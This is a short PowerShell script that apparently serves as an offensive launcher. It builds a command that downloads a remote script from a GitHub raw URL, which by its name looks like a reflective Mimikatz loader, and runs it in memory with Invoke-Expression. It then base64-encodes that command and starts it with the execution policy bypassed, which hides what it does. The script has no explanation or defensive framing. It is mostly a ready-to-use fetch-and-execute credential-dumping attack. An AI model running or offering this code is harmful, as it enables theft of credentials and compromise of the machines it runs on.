$Command = 'Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/b1nary0mega/DangerWillRobinson/refs/heads/main/winpwn-mimi_load-reflective.ps1" -UseBasicParsing).Content && mimiload -consoleoutput -noninteractive'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
$EncodedCommand = [Convert]::ToBase64String($Bytes)
powershell.exe -ExecutionPolicy Bypass -Scope Process -EncodedCommand $EncodedCommand
